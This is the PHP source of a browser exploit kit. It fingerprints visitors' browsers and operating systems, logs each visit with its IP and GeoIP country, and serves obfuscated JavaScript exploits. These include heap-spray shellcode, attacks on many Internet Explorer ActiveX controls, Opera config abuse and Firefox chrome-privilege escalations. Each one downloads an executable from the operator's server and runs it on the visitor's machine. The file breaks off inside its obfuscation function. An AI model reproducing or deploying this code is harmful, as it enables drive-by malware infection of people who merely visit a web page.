<?php

	error_reporting(0);

	@$sploit_version="2.0";

	@include("geoip.php");
	@include("config.php");

	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Expires: Thu, 01 Jan 2000 00:00:00 GMT");
	header("Last-Modified:  Thu, 01 Jan 2000 00:00:00 GMT");
	header("Pragma: no-cache");

	$ua = strtolower(getenv("HTTP_USER_AGENT"));

	if (!($conid = mysql_connect($SQLHOST,$SQLLOGIN,$SQLPWD))) {
		header("Location: ".$BACKURL);
		die;
	}
	if (!mysql_select_db($SQLDB,$conid)) {
		header("Location: ".$BACKURL);
		die;
	}

	if (eregi("(opera)[ /]([0-9]{1,2}).([0-9]{1,3})",$ua,$m)) $bc = 1;
	elseif (eregi("(msie)[ /]([0-9]{1,2}).([0-9]{1,3})",$ua,$m)) $bc = 2;
	elseif (eregi("(firefox)[ /]([0-9]{1,2}).([0-9]{1,2}).([0-9]{1,2}).([0-9]{1,2})",$ua,$m)) $bc = 3;
	elseif (eregi("(firefox)[ /]([0-9]{1,2}).([0-9]{1,2}).([0-9]{1,2})",$ua,$m)) $bc = 4;
	elseif (eregi("(chrome)[ /]([0-9]{1,2}).([0-9]{1,2}).([0-9]{1,2}).([0-9]{1,2})",$ua,$m)) $bc = 5;
	else $bc = 6;

	if ($bc < 6) {
		if ($bc == 3) {
			$ma = $m[2];
			$mi = $m[5];
		}elseif ($bc == 4) {
			$ma = $m[2];
			$mi = $m[4];
			$bc = 3;
		}else{
			$ma = $m[2];
			$mi = $m[3];
		}
	}

	if (strstr($ua,"windows nt 5.0")) $os = 1;
	elseif (strstr($ua,"windows nt 5.1")) {
		$os = 2;
		if (strstr($ua,"sv1")) $os = 3;
	}
	elseif (strstr($ua,"windows nt 5.2")) $os = 4;
	elseif (strstr($ua,"windows nt 6.0")) $os = 5;
	else $os = 6;

	$gi = geoip_open("geoip.dat",GEOIP_STANDARD);
	$ip = getip();
	$cn = geoip_country_id_by_addr($gi,$ip);

	mysql_query("
		INSERT INTO ".$TABLENAME."(ti,os,br,cn,ip,ma,mi)
		VALUES('".time()."','".$os."','".$bc."','".$cn."','".ip2long($ip)."','".$ma."','".$mi."')",$conid);
	$insert_id = mysql_insert_id();
	if (!$insert_id) header("Location: ".$BACKURL);
	if ($bc > 1)$URL .= "?id=".$insert_id;
	mysql_close($conid);


	if (!file_exists("load.exe")) header("Location: ".$BACKURL);

	if ($os > 5) { 
		header("Location: ".$BACKURL);
		die;
	}
	if ($bc > 3) {
		header("Location: ".$BACKURL);
		die;
	}

	if ($bc == 1) {
		$exp = "
			for (var i=0;i<navigator.plugins.length;i++) {
				var name = navigator.plugins[i].name;
				if (name.indexOf('Adobe Acrobat') != -1) {
					var my_div = document.createElement('div');
					my_div.innerHTML = '<embed width=100 height=100 src=\'".$PDF."?id=".$insert_id."\' type=\'application/pdf\'></embed>';
					document.body.appendChild(my_div);
					break;
				}
			}";
		if ($ma == 9 && $mi < 21) {
			$exp .= "
			blank_iframe = document.createElement('iframe'); 
			blank_iframe.src = 'about:blank'; 
			blank_iframe.setAttribute('id', 'blank_iframe_window'); 
			blank_iframe.setAttribute('style', 'display:none'); 
			document.appendChild(blank_iframe);
			blank_iframe_window.eval(
				\"var st;\"+
				\"config_iframe = document.createElement('iframe');\"+
				\"config_iframe.setAttribute('id', 'config_iframe_window');\"+
				\"config_iframe.src = 'opera:config';\"+
				\"document.appendChild(config_iframe);\"+
				\"app_iframe = document.createElement('img');\"+
				\"app_iframe.src = '".$URL."?id=".$insert_id."&opr=1';\"+
				\"document.appendChild(app_iframe);\"+
				\"getcache();\"+
				\"function getcache(){\"+
					\"cache_iframe = document.createElement('iframe');\"+
					\"cache_iframe.src = 'opera:cache';\"+
					\"cache_iframe.onload = function (){\"+
						\"cache = cache_iframe.contentDocument.childNodes[0].innerHTML.toUpperCase();\"+
						\"var re = new RegExp('(OPR\\\\\\\\\w{5}.EXE)</TD>\\\\\\\\\s*<TD>\\\\\\\\\d+</TD>\\\\\\\\\s*<TD><A HREF=\\\"'+'".strtoupper($URL."\\\\\\\\\?id=".$insert_id."&opr=1")."','');\"+
						\"filename = cache.match(re);\"+
						\"if(!filename)return(0);\"+
						\"config_iframe_window.eval(\"+
							\"\\\"opera.setPreference('Network','TN3270 App',opera.getPreference('User Prefs','Cache Directory4')+parent.filename[1]);\\\"+\"+
							\"\\\"app_link = document.createElement('a');\\\"+\"+
							\"\\\"app_link.setAttribute('href', 'tn3270://nothing');\\\"+\"+
							\"\\\"app_link.click();\\\"+\"+
							\"\\\"setTimeout(function(){opera.setPreference('Network','TN3270 App','telnet.exe');},1000);\\\"\"+
						\");\"+
						\"clearTimeout(st);\"+
						\"knock_iframe = document.createElement('iframe');\"+
						\"knock_iframe.src = '".$URL."?id=".$insert_id."&spl=6';\"+
						\"document.appendChild(knock_iframe);\"+
						\"return(0);\"+
					\"};\"+
					\"document.appendChild(cache_iframe);\"+
					\"st = setTimeout(function(){getcache();},2000);\"+
					\"return(0);\"+
				\"}\"
			);";
		}
		die("<html><body><script>".delete_sux(_crypt($exp)).'</script></body></html>');
	}

	if ($bc == 2) {
		$exp = '
			var url="'.$URL.'";
			var m=new Array();
			var mf=0;
			function hex(num,width){
				var digits="0123456789ABCDEF";
				var hex=digits.substr(num&0xF,1);
				while(num>0xF){
					num=num>>>4;
					hex=digits.substr(num&0xF,1)+hex;
				}
				var width=(width?width:0);
				while(hex.length<width)hex="0"+hex;
				return hex;
			}
			function addr(addr){
				return unescape("%u"+hex(addr&0xFFFF,4)+"%u"+hex((addr>>16)&0xFFFF,4));
			}
			function unes(str){
				var tmp="";
				for(var i=0;i<str.length;i+=4){
					tmp+=addr((str.charCodeAt(i+3)<<24)+
					(str.charCodeAt(i+2)<<16)+
					(str.charCodeAt(i+1)<<8)+
					str.charCodeAt(i));
				}
				return unescape(tmp);
			}
			function hav(){
				m=m;
				setTimeout("hav()",1000);
			}
			function gss(ss,sss){
				while(ss.length*2<sss)ss+=ss;
				ss=ss.substring(0,sss/2);
				return ss;
			}
			function ms(){
				var plc=unescape("'.
				unescape(
					"\x43\x43\x43\x43\x43\x43\xEB\x0F\x5B\x33\xC9\x66\xB9\x80\x01\x80".
					"\x33\xEF\x43\xE2\xFA\xEB\x05\xE8\xEC\xFF\xFF\xFF\x7F\x8B\x4E\xDF".
					"\xEF\xEF\xEF\x64\xAF\xE3\x64\x9F\xF3\x42\x64\x9F\xE7\x6E\x03\xEF".
					"\xEB\xEF\xEF\x64\x03\xB9\x87\x61\xA1\xE1\x03\x07\x11\xEF\xEF\xEF".
					"\x66\xAA\xEB\xB9\x87\x77\x11\x65\xE1\x07\x1F\xEF\xEF\xEF\x66\xAA".
					"\xE7\xB9\x87\xCA\x5F\x10\x2D\x07\x0D\xEF\xEF\xEF\x66\xAA\xE3\xB9".
					"\x87\x00\x21\x0F\x8F\x07\x3B\xEF\xEF\xEF\x66\xAA\xFF\xB9\x87\x2E".
					"\x96\x0A\x57\x07\x29\xEF\xEF\xEF\x66\xAA\xFB\xAF\x6F\xD7\x2C\x9A".
					"\x15\x66\xAA\xF7\x06\xE8\xEE\xEF\xEF\xB1\x66\x9A\xCB\x64\xAA\xEB".
					"\x85\xEE\xB6\x64\xBA\xF7\xB9\x07\x64\xEF\xEF\xEF\xBF\x87\xD9\xF5".
					"\xC0\x9F\x07\x78\xEF\xEF\xEF\x66\xAA\xF3\x64\x2A\x6C\x2F\xBF\x66".
					"\xAA\xCF\x87\x10\xEF\xEF\xEF\xBF\x64\xAA\xFB\x85\xED\xB6\x64\xBA".
					"\xF7\x07\x8E\xEF\xEF\xEF\xEC\xAA\xCF\x28\xEF\xB3\x91\xC1\x8A\x28".
					"\xAF\xEB\x97\x8A\xEF\xEF\x10\x9A\xCF\x64\xAA\xE3\x85\xEE\xB6\x64".
					"\xBA\xF7\x07\xAF\xEF\xEF\xEF\x85\xE8\xB7\xEC\xAA\xCB\xDC\x34\xBC".
					"\xBC\x10\x9A\xCF\xBF\xBC\x64\xAA\xF3\x85\xEA\xB6\x64\xBA\xF7\x07".
					"\xCC\xEF\xEF\xEF\x85\xEF\x10\x9A\xCF\x64\xAA\xE7\x85\xED\xB6\x64".
					"\xBA\xF7\x07\xFF\xEF\xEF\xEF\x85\x10\x64\xAA\xFF\x85\xEE\xB6\x64".
					"\xBA\xF7\x07\xEF\xEF\xEF\xEF\xAE\xB4\xBD\xEC\x0E\xEC\x0E\xEC\x0E".
					"\xEC\x0E\x6C\x03\xEB\xB5\xBC\x64\x35\x0D\x18\xBD\x10\x0F\xBA\x64".
					"\x03\x64\x92\xE7\x64\xB2\xE3\xB9\x64\x9C\xD3\x64\x9B\xF1\x97\xEC".
					"\x1C\xB9\x64\x99\xCF\xEC\x1C\xDC\x26\xA6\xAE\x42\xEC\x2C\xB9\xDC".
					"\x19\xE0\x51\xFF\xD5\x1D\x9B\xE7\x2E\x21\xE2\xEC\x1D\xAF\x04\x1E".
					"\xD4\x11\xB1\x9A\x0A\xB5\x64\x04\x64\xB5\xCB\xEC\x32\x89\x64\xE3".
					"\xA4\x64\xB5\xF3\xEC\x32\x64\xEB\x64\xEC\x2A\xB1\xB2\x2D\xE7\xEF".
					"\x07\x1B\x11\x10\x10\xBA\xBD\xA3\xA2\xA0\xA1\xEF".
					$URL."&spl=5").
				'");
				CollectGarbage();
				if (mf)return(0);
				mf=1;
				var hsta=0x0c0c0c0c,hbs=0x100000,pl=plc.length*2,sss=hbs-(pl+0x38);
				var ss=gss(addr(hsta),sss),hb=(hsta-hbs)/hbs;
				for(i=0;i<hb;i++)m[i]=ss+plc;
				hav();
				return(1);
			}
			function cobj(obj){
				var ret=null;
				if(obj.substring(0,1)=="{"){
					try{
						var clsid=obj.substring(1,obj.length-1);
						ret=document.createElement("object");
						ret.setAttribute("classid","clsid:"+clsid);
						return ret;
					}catch(e){
						return null;
					}
				}else{
					try{
						ret=new ActiveXObject(obj);
						return ret;
					}catch(e){
						return null;
					}
				}
			}';
		if ($ma <= 6) {
			$exp .='
			var padding = "AAAA";
			var heapBase = 0x00150000;
			var memo;
			function init(maxAlloc){
				while (4 + padding.length*2 + 2 < 65535)padding += padding;
				memo = new Array();
				flush();
			}
			function flush(){
				delete memo["plunger"];
				CollectGarbage();
				memo["plunger"] = new Array();
				var bytes = new Array(32, 64, 256, 32768);
				for (var i = 0; i < 6; i++) {
					for(var n = 0; n < 4; n++) {
						var len = memo["plunger"].length;
						eval("memo[\"plunger\"][len] = padding.substr(0, (" + bytes[n] + "-6)/2);");
					}
				}
			}
			function alloc(arg, tag){
				var size;
				size = arg;
				if (size == 32 || size == 64 || size == 256 || size == 32768) {}
				if ( ! memo[tag] )memo[tag] = new Array();
				var len = memo[tag].length;
				memo[tag][len] = padding.substr(0, (arg-6)/2);
			}
			function alloc_str(arg, tag){
				var size;
				size = 4 + arg.length*2 + 2;
				if (size == 32 || size == 64 || size == 256 || size == 32768) {}
				if ( ! memo[tag])memo[tag] = new Array();
				var len = memo[tag].length;
				memo[tag][len] = arg.substr(0, arg.length);
			}
			function free(tag) { 
				delete memo[tag];
				CollectGarbage();
				flush();
			}
			function CreateO(o,n){
				var r=null;
				try{r=o.CreateObject(n)}catch(e){}
				if(!r){try{r=o.CreateObject(n,"")}catch(e){}}
				if(!r){try{r=o.CreateObject(n,"","")}catch(e){}}
				if(!r){try{r=o.GetObject("",n)}catch(e){}}
				if(!r){try{r=o.GetObject(n,"")}catch(e){}}
				if(!r){try{r=o.GetObject(n)}catch(e){}}
				return(r);
			}
			function Go(a){
				var eurl=url+"&spl=1";
				var fname="win'.get_random_string(rand(3,12)).'.exe";
				var fso=CreateO(a,"Scripting.FileSystemObject")
				var sap=CreateO(a,"Shell.Application");
				var x=CreateO(a,"ADODB.Stream");
				var nl=null;
				fname=fso.BuildPath(fso.GetSpecialFolder(2),fname);
				x.Mode=3;
				try{nl=CreateO(a,"Micr"+"osoft.XMLH"+"TTP");nl.open("GET",eurl,false);}
				catch(e){try{nl=CreateO(a,"MSXML2.XMLHTTP");nl.open("GET",eurl,false);}
				catch(e){try{nl=CreateO(a,"MSXML2.ServerXMLHTTP");nl.open("GET",eurl,false);}
				catch(e){try{nl=new XMLHttpRequest();nl.open("GET",eurl,false);}
				catch(e){return 0;}}}}
				x.Type=1;
				nl.send(null);
				rb=nl.responseBody;
				x.Open();
				x.Write(rb);
				x.SaveTofile(fname,2);
				sap.ShellExecute(fname);
				return 1;
			}
			function mdac() {
				var i=0;
				var target=new Array(
				"BD96C556-65A3-11D0-983A-00C04FC29E36",
				"BD96C556-65A3-11D0-983A-00C04FC29E30",
				"AB9BCEDD-EC7E-47E1-9322-D4A210617116",
				"0006F033-0000-0000-C000-000000000046",
				"0006F03A-0000-0000-C000-000000000046",
				"6e32070a-766d-4ee6-879c-dc1fa91d2fc3",
				"6414512B-B978-451D-A0D8-FCFDF33E833C",
				"7F5B7F63-F06F-4331-8A26-339E03C0AE3D",
				"06723E09-F4C2-43c8-8358-09FCD1DB0766",
				"639F725F-1B2D-4831-A9FD-874847682010",
				"BA018599-1DB3-44f9-83B4-461454C84BF8",
				"D0C07D56-7C69-43F1-B4A0-25F5A11FAB19",
				"E8CCCDDF-CA28-496b-B050-6C07C962476B",null);
				while(target[i]){
					var a=null;
					a=document.createElement("object");
					a.setAttribute("classid","clsid:"+target[i]);
					if(a){try{var b=CreateO(a,"Shell.Application");if(b){Go(a);}}catch(e){}}
					i++;
				}
				return 0;
			}
			function wfi() {
				try{
					obj=cobj("WebViewFolderIcon.WebViewFolderIcon.1");
					if(obj){
						ms();
						for(var i=0;i<128;i++){
							var wvfio=new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1");
							try{wvfio.setSlice(0x7ffffffe,0,0,202116108);}catch(e){}
							var wvfit=new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1");
						}
					}
				}catch(e){}
				return 0;
			}
			function com() {
				try{
					obj=cobj("{EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F}");
					if(obj){
						ms();
						z=Math.ceil(0x0c0c0c0c);
						z=document.scripts[0].createControlRange().length;
					}
				}catch(e){}
				return 0;
			}
			function dani() {
				try{
					obj=cobj("DirectAnimation.PathControl");
					if(obj){
						ms();
						init();
						var jmpecx = 0x0c0c0c0c;
						var vtable = addr(0x7ceb9090);
						for (var i = 0; i < 124/4; i++)vtable += addr(jmpecx);
						vtable += padding.substr(0, (1008-138)/2);
						var fakeObjPtr = heapBase + 0x688 + ((1008+8)/8)*48;
						var fakeObjChunk = padding.substr(0, (0x200c-4)/2) + addr(fakeObjPtr) + padding.substr(0, 14/2);
						CollectGarbage();
						flush();
						for (var i = 0; i < 100; i++)alloc_str(vtable);
						alloc_str(vtable, "lookaside");
						free("lookaside");
						for (var i = 0; i < 100; i++)alloc(0x2010);
						for (var i = 0; i < 2; i++) {
							alloc_str(fakeObjChunk);
							alloc_str(fakeObjChunk, "freeList");
						}
						alloc_str(fakeObjChunk);
						free("freeList");
						obj.KeyFrame(0x40000801, new Array(1), new Array(1));
					}
				}catch(e){}
				return 0;
			}';
		}
		$exp .= '
			function office(){
				var dir=new Array(
				"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\StartUp\\office.exe",
				"C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Iniciar\\office.exe",
				"C:\\Documents and Settings\\All Users\\Menu Inicio\\Programas\\Inicio\\office.exe",
				"C:\\Documents and Settings\\All Users\\Kuynnistu-valikko\\Ohjelmat\\Kuynnistys\\office.exe",
				"C:\\Documents and Settings\\All Users\\Menu Dumarrer\\Programmes\\Dumarrage\\office.exe",
				"C:\\Documents and Settings\\All Users\\Menuen Start\\Programmer\\Start\\office.exe",
				"C:\\Documents and Settings\\All Users\\Menu Start\\Programma\'s\\Opstarten\\office.exe",
				"C:\\Documents and Settings\\All Users\\Start Menu\\Programlar\\BASLANGI\\office.exe",
				"C:\\Documents and Settings\\All Users\\Menu Start\\Programy\\Autostart\\office.exe",
				"C:\\Documents and Settings\\All Users\\Start-meny\\Programmer\\Oppstart\\office.exe",
				"C:\\Documents and Settings\\All Users\\Start-menyn\\Program\\Autostart\\office.exe",
				"C:\\Documents and Settings\\All Users\\Menu Avvio\\Programmi\\Esecuzione automatica\\office.exe",
				"C:\\Dokumente und Einstellungen\\All Users\\Startmenu\\Programme\\Autostart\\office.exe");
				var obj=null;
				obj=cobj("snpvw.Snapshot Viewer Control.1");
				if (obj){
					for(j=0;j<dir.length;j++){
						try{
							obj.Zoom = 0;
							obj.ShowNavigationButtons = false;
							obj.AllowContextMenu = false;
							obj.SnapshotPath = url+"&opr=1";
							obj.CompressedPath = dir[j];
							obj.PrintSnapshot();
						}catch(e){}
					}
				}
				return 0;
			}
			function dl(){
				try{
					var obj=null;
					obj=cobj("Downloader.DLoader.1");
					if (obj){
						obj.DownloadAndInstall(url);
					}
				}catch(e){}
				return 0;
			}
			function wks(){
				try{
					var obj=null;
					obj=cobj("{00E1DB59-6EFD-4CE7-8C0A-2DA3BCAAD9C6}");
					if(obj){
						ms();
						var num = 202116108;
						obj.WksPictureInterface = num;
					}
				}catch(e){}
				return 0;
			}
			function ogame(){
				try{
					var obj=null;
					obj=cobj("{F917534D-535B-416B-8E8F-0C04756C31A8}");
					if(obj){
						ms();
						var buf = "";
						while (buf.length < 600) buf += "\x0c\x0c\x0c\x0c";
						obj.IEStartNative(buf);
					}
				}catch(e){}
				return 0;
			}
			function ca(){
				try{
					var obj=null;
					obj=cobj("{BF6EFFF3-4558-4C4C-ADAF-A87891C5F3A3}");
					if (obj.AddColumn) {
						ms();
						var buf = addr(0x0c0c0c0c);
						while(buf.length < 128)buf += buf;
						buf = buf.substring(0, 128);
						obj.AddColumn(buf,1);
					}
				}catch(e){}
				return 0;
			}
			function buddy(){
				try {
					var obj=null;
					obj = cobj("Sb.SuperBuddy");
					if (obj) {
						ms();
						obj.LinkSBIcons(0x0c0c0c0c);
					}
				} catch(e){}
				return 0;
			}
			function gomweb(){
				try {
					var obj=null;
					obj = cobj("GomWebCtrl.GomManager.1");
					if (obj) {
						ms();
						var buf="AAAA";
						while (buf.length < 506) buf += buf;
						buf = buf.substring(0,506);
						buf += addr(0x0c0c0c0c);
						obj.OpenURL(buf);
					}
				} catch(e){}
				return 0;
			}
			function xmlcore(){
				try {
					var xml = null;
					var xml = cobj("Msxml2.XMLHTTP.6.0");
					if (xml){
						xml = cobj("Msxml2.XMLHTTP.4.0");
					}
					if(!xml)return 0;
					var obj=null;
					obj = cobj("{88d969c5-f192-11d4-a65f-0040963251e5}");
					obj = obj.object
					if(obj) {
						ms();
						try {obj.open(new Array(),new Array(),new Array(),new Array(),new Array());} catch(e) {};
						obj.open(new Object(),new Object(),new Object(),new Object(),new Object());
						obj.setRequestHeader(new Object(),"...");
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
						obj.setRequestHeader(new Object(),0x1016660);
					}
				} catch(e){}
				return 0;
			}
			function quick(){
				try {
					var obj=null;
					obj = cobj("QuickTime.QuickTime.4");
					if (obj) {
						ms();
						var buf = "";
						for(var i=0;i<200;i++) {
							buf += "AAAA";
						}
						buf += "AAA";
						for(var i=0;i<3;i++)buf += "\x0c\x0c\x0c\x0c";
						var my_div = document.createElement("div");
						my_div.innerHTML = 
						"<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" width=\"200\" height=\"200\">" +
						"<param name=\"src\" value=\"object_rtsp\">" +
						"<param name=\"type\" value=\"image/x-quicktime\">" +
						"<param name=\"autoplay\" value=\"true\">" +
						"<param name=\"qtnext1\" value=\"<rtsp://BBBB:"+buf+">T<myself>\">" +
						"<param name=\"target\" value=\"myself\">" +
						"</object>";
						document.body.appendChild(my_div);

					}
				} catch(e) {}
				return 0;
			}
			function real(){
				try {
					var obj=null;
					obj = cobj("IERPCtl.IERPCtl.1");
					if (obj) {
						if(obj.PlayerProperty("PRODUCTVERSION")>"6.0.14.552") {
							obj = cobj("{2F542A2E-EDC9-4BF7-8CB1-87C9919F7F93}");
							ms();
							var m = "";
							var buf = addr(0x0c0c0c0c);
							while (buf.length < 32)	buf += buf;
							buf = buf.substring(0,32);
							m = obj.Console;
							obj.Console = buf;
							obj.Console = m;
							m = obj.Console;
							obj.Console = buf;
							obj.Console = m;
						}
					}
				} catch(e){}
				return 0;
			}
			function ntaudio(){
				try{
					var obj=null;
					obj=cobj("{77829F14-D911-40FF-A2F0-D11DB8D6D0BC}");
					if(obj){
						ms();
						var buf = addr(0x0c0c0c0c);
						while (buf.length < 5200) buf += buf;
						buf = buf.substring(0,5200);
						obj.SetFormatLikeSample(buf);
					}
				}catch(e){}
				return 0;
			}
			function creative(){
				try{
					var obj=null;
					obj=cobj("{0A5FD7C5-A45C-49FC-ADB5-9952547D5715}");
					if(obj){
						ms();
						var buf = addr(0x09090909);
						while (buf.length < 512) buf += buf;
						buf = buf.substring(0,512);
						obj.cachefolder = buf;
					}
				}catch(e){}
				return 0;
			}

			function pdf(){
				try {
					var vers = new Array(0,0,0);
					var ver = "0";
					var obj = null;
					obj = cobj("AcroPDF.PDF");
					if (!obj){
						obj = cobj("PDF.PdfCtrl");
					}
				
					if (obj) {
						var my_div = document.createElement("div");
						my_div.innerHTML = "<iframe src=\"'.$PDF.'?id='.$insert_id.'\" width=100 height=100 style=\"display:none\"></iframe>";
						document.body.appendChild(my_div);
					}
				} catch(e){}
				return 0;
			}

			if (';
		if ($ma <= 6) {
			$exp .='
				mdac() ||';
		}
		$exp .='
				office() ||
				dl() ||
				pdf() ||';
		if ($ma <= 6) {
			$exp .='
				wfi() ||
				com() ||';
		}
		$exp .='
				creative() ||
				wks() ||
				ogame() ||
				ca() ||
				buddy() ||
				gomweb() ||
				xmlcore() ||
				quick() ||
				real() ||
				ntaudio()';
		if ($ma <= 6) {
			$exp .='
				 || dani()';
		}
		$exp .='
				) {}
			';

		die("<html><body><script>".delete_sux(_crypt($exp)).'</script></body></html>');
	}

	if ($bc == 3) {
		die("<html><body><script>".delete_sux(_crypt(
			'
			var url="'.$URL.'";
			function VFxl_pAg(ejJzc3jc)
			{
				var PhUGOqIc = "abcdefghiklmnopqrstuvwxyz0123456789";
				var TcDWRlcA = \'\';
				for (var VQbdiisE=0; VQbdiisE<ejJzc3jc; VQbdiisE++) {
					var rn5b9oly = Math.floor(Math.random() * PhUGOqIc.length);
					TcDWRlcA += PhUGOqIc.substring(rn5b9oly, rn5b9oly+1);
				}

				return TcDWRlcA;
			}

			function dvUtdivX()
			{
				if (window.getState(window.persist) == 3) {
					window.processRun(window.process, window.file);
					parent.window.location = "about:blank";
				} else {
					setTimeout("window.NMfM5opU();", 100);
				}
			}

			window.NMfM5opU = dvUtdivX;

			function m3Z86bZI()
			{
				try {
					var ZZixCOGa = VFxl_pAg(6);
					var DC5kFgKW = document.createElement("div");
					DC5kFgKW.setAttribute("style", "display: none; -moz-binding: url(\'chrome://xbl-marquee/content/xbl-marquee.xml#marquee-horizontal\');");
					document.body.appendChild(DC5kFgKW);
					var aZBMey0n = DC5kFgKW.stop.eval.call(null, "Function");

					var JQ8ZloZF = aZBMey0n("return function(C){ var file=C.classes[\'@mozilla.org/file/local;1\'].createInstance(C.interfaces.nsILocalFile); file.initWithPath(\'c:\\\\" + ZZixCOGa + ".exe\'); return file; }")();
					window.file = JQ8ZloZF(Components);

					var hIa6BGaW = aZBMey0n("return function(C){ return C.classes[\'@mozilla.org/process/util;1\'].createInstance(C.interfaces.nsIProcess); }")();
					window.process = hIa6BGaW(Components);

					var E8NydSaD = aZBMey0n("return function(C,file){ io=C.classes[\'@mozilla.org/network/io-service;1\'].getService(C.interfaces.nsIIOService);source=io.newURI(\''.$URL.'&spl=3\',\'UTF8\',null);persist=C.classes[\'@mozilla.org/embedding/browser/nsWebBrowserPersist;1\'].createInstance(C.interfaces.nsIWebBrowserPersist);persist.persistFlags=8192|4096;persist.saveURI(source,null,null,null,null,file); return persist; }")();
					window.persist = E8NydSaD(Components,window.file);

					window.getState = aZBMey0n("return function(persist) { return persist.currentState; }")();
					window.processRun = aZBMey0n("return function(process,file) { process.init(file); process.run(false,[],0); }")();

					setTimeout("window.NMfM5opU();", 100);
				} catch(e) {
				}
				return 0;
			}

			var chromeUrl = "chrome://global/content/mozilla.xhtml";
			var jsUrl;
			var rel;

			function a(ev) {
				function gr() {
					return rel;
				}

				var code = "Object.prototype.__defineGetter__.call(ev.target, \'rel\', gr);";
				var o = { setChecked : Script };
				var x = document.getElementById("x");
				var s = x.__lookupSetter__("checked").call(o, code);
				s();
			}

			function b(u) {
				var a = [ "", u ];
				a.__defineSetter__("0", Components.lookupMethod(frames[1].location, "href"));
				a.toString = a.shift;
				a.match = a.shift;
				rel = a;
			}

			function c() {
				b(chromeUrl);

				var d = frames[0].document;
				var link = d.createElement("link");
				link.addEventListener("test", function(ev) { a(ev); }, true);
				var ev = d.createEvent("Events");
				ev.initEvent("test", true, true);
				link.dispatchEvent(ev);

				link.setAttribute("id", "l");
				link.setAttribute("rel", "a");
				d.body.appendChild(link);
			}

			function d() {
				b(jsUrl);

				var link = frames[0].document.getElementById("l");
				var p = link.parentNode;
				p.removeChild(link);
				p.appendChild(link);
			}

			function e() {
				var i = document.createElement("i");
				i.setAttribute("id", "x");
				i.setAttribute("style", "-moz-binding: url(\'chrome://global/content/bindings/checkbox.xml#checkbox-baseline\'); display: none;");
				document.body.appendChild(i);

				var ifr = document.createElement("iframe");
				ifr.setAttribute("width", 2);
				ifr.setAttribute("height", 2);
				ifr.style.border = "0";
				document.body.appendChild(ifr);
				ifr.onload = d;
				c();
			}

			function FRsPjvAE()
			{
				try {
					var ZZixCOGa = VFxl_pAg(6);
					jsUrl = "javascript:file=Components.classes[\'@mozilla.org/file/local;1\'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\'c:\\\\" + ZZixCOGa + ".exe\');io=Components.classes[\'@mozilla.org/network/io-service;1\'].getService(Components.interfaces.nsIIOService);source=io.newURI(\''.$URL.'&spl=2\',\'UTF8\',null);persist=Components.classes[\'@mozilla.org/embedding/browser/nsWebBrowserPersist;1\'].createInstance(Components.interfaces.nsIWebBrowserPersist);persist.persistFlags=8192|4096;persist.saveURI(source,null,null,null,null,file);process=Components.classes[\'@mozilla.org/process/util;1\'].createInstance(Components.interfaces.nsIProcess);function                   check(){if(persist.currentState==3){process.init(file);process.run(false,[],0);parent.window.location=\'about:blank\'}else{setTimeout(\'check()\',100)}}setTimeout(\'check()\',100);void(0);";

					var ifr = document.createElement("iframe");
					ifr.setAttribute("width", 2);
					ifr.setAttribute("height", 2);
					ifr.style.border = "0";
					document.body.appendChild(ifr);
					ifr.onload = e;
				} catch(e) {
				}
				return 0;
			}

			function pdf() {
				for (var i=0;i<navigator.plugins.length;i++) {
					var name = navigator.plugins[i].name;
					if (name.indexOf("Adobe Acrobat") != -1) {
						var my_div = document.createElement("div");
						my_div.innerHTML = "<embed width=100 height=100 src=\"'.$PDF.'?id='.$insert_id.'\" type=\"application/pdf\"></embed>";
						document.body.appendChild(my_div);
						break;
					}
				}
			}

			pdf();
			m3Z86bZI();
			FRsPjvAE();
			'
		)).'</script></body></html>');
	}

	header("Location: ".$BACKURL);
	die;

	function delete_sux( $content )
	{
		$content = str_replace( "\n", "", $content );
		$content = str_replace( "\r", "", $content );
		$content = str_replace( "\t", "", $content );
		$content = str_replace( " ", "", $content );
		$content = str_replace( "function", "function ", $content );
		$content = str_replace( "var", "var ", $content );
		$content = str_replace( "newArray", "new Array ", $content );
		$content = str_replace( "return", "return ", $content );
		
		return $content;
	}

	function get_random_string( $len ) 
	{
		$result = "";
		$nums = "1234567890";
		$syms = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		$sux = $nums.$syms;
		
		for ($i = 0; $i <= $len; $i++ )
		{
			$num = rand( 0, strlen( $sux ) - 1 );
			$result .= $sux[ $num ];
		}
		
		return $syms[ rand(0,strlen( $syms ) - 1 ) ].$result;
	}

	function getip ()
	{
		if ((@getenv('HTTP_CLIENT_IP') AND @strcasecmp(@getenv('HTTP_CLIENT_IP'), 'unknown')))
		{
			$ip = @getenv('HTTP_CLIENT_IP');
		}
		else
		{
			if ((@getenv('HTTP_X_FORWARDED_FOR') AND @strcasecmp(@getenv('HTTP_X_FORWARDED_FOR'), 'unknown')))
			{
				$ip = @getenv('HTTP_X_FORWARDED_FOR');
			}
			else
			{
				if ((@getenv('REMOTE_ADDR') AND @strcasecmp(@getenv('REMOTE_ADDR'), 'unknown')))
				{
					$ip = @getenv('REMOTE_ADDR');
				}
				else
				{
					if (((isset($_SERVER['REMOTE_ADDR']) AND @$_SERVER['REMOTE_ADDR']) AND @strcasecmp(@$_SERVER['REMOTE_ADDR'], 'unknown')))
					{
						$ip = @$_SERVER['REMOTE_ADDR'];
					}
					else
					{
						$ip = 'Unknown';
					}
				}
			}
		}
		return $ip;
	}


	function _crypt($content)
	{
		if(empty($content)) return '';
		
